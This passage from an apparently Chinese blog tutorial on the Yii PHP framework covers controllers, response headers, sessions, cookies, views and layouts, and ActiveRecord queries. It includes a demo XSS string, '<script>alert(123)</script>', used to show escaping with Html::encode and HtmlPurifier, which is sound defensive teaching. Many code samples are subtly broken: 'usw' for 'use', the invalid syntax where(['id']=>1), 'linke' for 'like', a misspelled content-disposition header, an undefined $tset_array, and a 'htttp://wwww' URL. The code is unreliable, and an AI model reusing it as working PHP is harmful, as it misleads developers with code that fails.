class="title">Controller</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="comment">// $request = \YII::$app-&gt;request;//全局类</span></span></span><br><span class="line"><span class="php">    <span class="comment">// echo $request-&gt;get('id',20); //当没有进行get时 默认为20</span></span></span><br><span class="line"><span class="php">    $res =  \YII::$app-&gt;response;</span></span><br><span class="line"><span class="php">    <span class="comment">// 添加头部信息</span></span></span><br><span class="line"><span class="php">    $res-&gt;headers-&gt;add(<span class="string">'pragma'</span>,<span class="string">'no-cache'</span>);</span></span><br><span class="line"><span class="php">    $res-&gt;headers-&gt;set(<span class="string">'pragma'</span>,<span class="string">'no-cache'</span>);</span></span><br><span class="line"><span class="php">    $res-&gt;headers-&gt;remove(<span class="string">'pragma'</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">// 实现跳转</span></span></span><br><span class="line"><span class="php">    $res-&gt;headers-&gt;add(<span class="string">'location'</span>,<span class="string">'http://www.baidu.com'</span>);</span></span><br><span class="line"><span class="php">    <span class="comment">// 有专门跳转方法</span></span></span><br><span class="line"><span class="php">    <span class="keyword">$this</span>-&gt;redirect(<span class="string">'htttp://wwww.baidu.com'</span>,<span class="number">302</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">//进行文件下载</span></span></span><br><span class="line"><span class="php">    <span class="comment">// 访问文件默认在 WEB目录下</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    $res-&gt;headers-&gt;add(<span class="string">'content-dispostion'</span>,<span class="string">'attachment; filename="a.jpg"'</span>)</span></span><br><span class="line"><span class="php">    $res-&gt;sendFile(<span class="string">'./robots.txt'</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="YII-操作Session"><a href="#YII-操作Session" class="headerlink" title="YII 操作Session"></a>YII 操作Session</h3><p>session 的存储路径可在 php.ini 中找到</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    $session = \YII::$app-&gt;session;</span></span><br><span class="line"><span class="php">    $session-&gt;open();   <span class="comment">//用于开启session</span></span></span><br><span class="line"><span class="php">    <span class="comment">// if($session-&gt;isActive)&#123;  //用于检测 session 是否开启</span></span></span><br><span class="line"><span class="php">    <span class="comment">//   echo "session is active";</span></span></span><br><span class="line"><span class="php">    <span class="comment">// &#125;</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    $session-&gt;set(<span class="string">'user'</span>,<span class="string">'夏利'</span>);   <span class="comment">//用于设置 session</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0l8xjhx9jj311b0ekdhe.jpg" alt=""></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> $session-&gt;get(<span class="string">'user'</span>);  <span class="comment">// 获得session值</span></span><br><span class="line"></span><br><span class="line">$session-&gt;remove(<span class="string">'user'</span>);</span><br><span class="line"></span><br><span class="line">$session[<span class="string">'user'</span>] = <span class="string">'张三'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unset</span>($session[<span class="string">'user'</span>]);</span><br></pre></td></tr></table></figure>
<h3 id="YII-操作Cookie"><a href="#YII-操作Cookie" class="headerlink" title="YII 操作Cookie"></a>YII 操作Cookie</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">cookie</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    $cookies = \YII::$app-&gt;response-&gt;cookies;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    $cookie_data = <span class="keyword">array</span>(<span class="string">'name'</span>=&gt;<span class="string">'user'</span>,<span class="string">'value'</span>=&gt;<span class="string">'zhangsi'</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    $cookies-&gt;add(<span class="keyword">new</span> cookie($cookie_data));</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="View-层"><a href="#View-层" class="headerlink" title="View 层"></a>View 层</h2><p>要访问视图文件  需要把视图文件放到与控制器名相同的文件夹下</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">cookie</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;renderPartial(<span class="string">'index'</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<p>.\basic\views\Hello.php</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;h1&gt;小姐姐&lt;/h1&gt;"</span>;</span></span><br></pre></td></tr></table></figure>
<p>访问<a href="http://127.0.0.1/basic/web/index.php?r=hello/index" target="_blank" rel="noopener">http://127.0.0.1/basic/web/index.php?r=hello/index</a><br>成功得到视图文件</p>
<p>当要在view文件中使用控制器中的的变量时  需要把数据放入数组当中</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">cookie</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    $hello_str = <span class="string">'小哥哥'</span>;</span></span><br><span class="line"><span class="php">    $test_array = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">//创建一个数组 存放数据</span></span></span><br><span class="line"><span class="php">    $array = <span class="keyword">array</span>();</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">// 将数据放入数组</span></span></span><br><span class="line"><span class="php">    $data[<span class="string">'view_str'</span>] = $hello_str;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    $data[<span class="string">'view_array'</span>] = $tset_array;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;renderPartial(<span class="string">'index'</span>,$data);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="php"><span class="meta">&lt;?</span>=$view_str;<span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="php"><span class="meta">&lt;?</span>=$view_array[<span class="number">0</span>];<span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>当$hello_str  可控 会造成恶意代码攻击  可以使用两个方法进行过滤</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$hello_str = '小姐姐<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(123)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>';</span><br></pre></td></tr></table></figure>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">helpers</span>\<span class="title">Html</span>;  <span class="comment">// 这个类会将script 转移</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">helpers</span>\<span class="title">HtmlPurifier</span>;   <span class="comment">//这个类会将script 直接过滤掉</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="php"><span class="meta">&lt;?</span>=Html::encode($view_str);<span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="php"><span class="meta">&lt;?</span>=HtmlPurifier::process($view_str);<span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0lbuqssloj30kt06eq33.jpg" alt=""></p>
<p>优化布局<br>当在hello文件夹中有about.php index.php</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span> <span class="attr">dir</span>=<span class="string">"ltr"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    hello about</span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span> <span class="attr">dir</span>=<span class="string">"ltr"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    hello index</span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>可见 除了 hello about hello index 其他的都显得 多余<br>接下来把 多余的代码 放在basic\views\layouts 文件夹下 并创建一个common.php<br>内容为</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span> <span class="attr">dir</span>=<span class="string">"ltr"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>hello common<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="php"><span class="meta">&lt;?</span>=$content;<span class="meta">?&gt;</span></span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>index.php和about.php直接写hello index  hello about</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">cookie</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $layout = <span class="string">'common'</span>;  <span class="comment">//指定模板</span></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">      <span class="comment">// 调用render方法</span></span></span><br><span class="line"><span class="php">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;render(<span class="string">'index'</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br></pre></td></tr></table></figure>
<p>访问<a href="http://127.0.0.1/basic/web/index.php?r=hello/index" target="_blank" rel="noopener">http://127.0.0.1/basic/web/index.php?r=hello/index</a><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0lcgg7rg2j30dm04xjr9.jpg" alt=""></p>
<p>如果想在index.php视图访问about.php视图文件<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0lcp2erquj30qv0ba3zf.jpg" alt=""></p>
<p>如果访问另一个视图文件的变量<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0lcyp5qtaj30yw0dmgnb.jpg" alt=""><br>YI操作数据块<br>当不想显示模板中的一些内容时 用<br>$this-&gt;endBlock();<br>来定义一个html代码块，该代码块可在layout文件中引用，<br>$this-&gt;blocks[‘block_name’]</p>
<h2 id="Model"><a href="#Model" class="headerlink" title="Model"></a>Model</h2><h3 id="YII-数据模型"><a href="#YII-数据模型" class="headerlink" title="YII 数据模型"></a>YII 数据模型</h3><p>对数据库进行增删改查操作数据库<br>实现创建数据库yii 表test  tittle id 字段</p>
<p>在config文件夹中的db.php配置好数据库</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php">usw app\models\Test;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">HelloControllers</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    $sql = <span class="string">'select * from test where id=:id'</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">// 首先产生的每一条记录被放在一个对象里面 每一个对象被放在数组里面</span></span></span><br><span class="line"><span class="php">    $results = Test::findBySql($sql,<span class="keyword">array</span>(<span class="string">':id'</span>=&gt;<span class="number">1</span>))-&gt;all();    <span class="comment">// 利用占位符 可以防止sql注入 无论拼接的是什么 都会当成一个字符</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>但是这样看起来代码有点多  可以用find()方法  将查询条件放到数据中去</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php">usw app\models\Test;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">HelloControllers</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="comment">// $sql = 'select * from test where id=:id';</span></span></span><br><span class="line"><span class="php">    <span class="comment">//</span></span></span><br><span class="line"><span class="php">    <span class="comment">// // 首先产生的每一条记录被放在一个对象里面 每一个对象被放在数组里面</span></span></span><br><span class="line"><span class="php">    <span class="comment">// $results = Test::findBySql($sql,array(':id'=&gt;1))-&gt;all();    // 利用占位符 可以防止sql注入 无论拼接的是什么 都会当成一个字符</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    $results = Test::find()-&gt;where([<span class="string">'id'</span>]=&gt;<span class="number">1</span>)-&gt;all();</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>这样就显得简洁多了<br>如果要查询id&gt;0 的话就要用第三个参数</p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$results = Test::find<span class="function"><span class="params">()</span>-&gt;</span>where<span class="function"><span class="params">([<span class="string">'&gt;'</span>,<span class="string">'id'</span>,<span class="string">'0'</span>])</span>-&gt;</span>all();</span><br></pre></td></tr></table></figure>
<p>查询id&gt;=1  id&lt;=2</p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$results = Test::find<span class="function"><span class="params">()</span>-&gt;</span>where<span class="function"><span class="params">([<span class="string">'between'</span>,<span class="string">'id'</span>,<span class="number">1</span>,<span class="number">2</span>])</span>-&gt;</span>all();</span><br></pre></td></tr></table></figure>
<p>like 操作  </p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$results = Test::find<span class="function"><span class="params">()</span>-&gt;</span>where<span class="function"><span class="params">([<span class="string">'linke'</span>,<span class="string">'title'</span>,<span class="string">'title'</span>])</span>-&gt;</span>all();</span><br></pre></td></tr></table></figure>
<p>用asArray 可以降低农村使用量和使代码，数据清晰</p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$results = Test::find<span class="function"><span class="params">()</span>-&gt;</span>where<span class="function"><span class="params">([<span class="string">'linke'</span>,<span class="string">'title'</span>,<span class="string">'title'</span>])</span>-&gt;</span>asArray<span class="function"><span class="params">()</span>-&gt;</span>all();</span><br></pre></td></tr></table></figure>
<p>批量查询<br><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">foreach<span class="function"><span class="params">(Test::find()-&gt;batch(<span class="number">1</span>) as $tests)</span>&#123;</span></span><br><span class="line"><span class="function">      <span class="title">printf</span><span class="params">(count($tests))</span>   // 每次操作一条数据 将结果放在<span class="title">$tests</span></span></span><br><span class="line"><span class="function">    &#125;</span></span><br></pre></td></tr></table></figure></p>
<p>进行删除操作<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$results = Test::find()-&gt;where([<span class="string">'id'</span>]=&gt;<span class="number">1</span>)-&gt;all();</span><br><span class="line">    $results[<span class="number">0</span>]-&gt;delete();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//第二中方法,及利用占位符</span></span><br><span class="line">    Test::deleteAll(<span class="string">'id&gt;:id'</span>,<span class="keyword">array</span>(<span class="string">':id'</span>=&gt;<span class="number">0</span>)); <span class="comment">//</span></span><br></pre></td></tr></table></figure></p>
<p>进行增加数据</p>
